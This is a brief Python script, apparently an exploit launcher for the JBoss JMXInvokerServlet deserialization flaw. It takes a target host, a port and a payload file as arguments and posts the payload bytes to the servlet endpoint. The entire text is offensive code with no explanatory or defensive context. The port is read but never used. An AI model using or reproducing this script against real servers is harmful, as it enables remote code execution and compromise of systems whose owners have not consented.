import requests
import sys
host = sys.argv[1]
port = int(sys.argv[2])
payloadobj = open(sys.argv[3], 'rb').read()
URL = host + "/invoker/JMXInvokerServlet"
requests.post(URL, data=payloadobj)
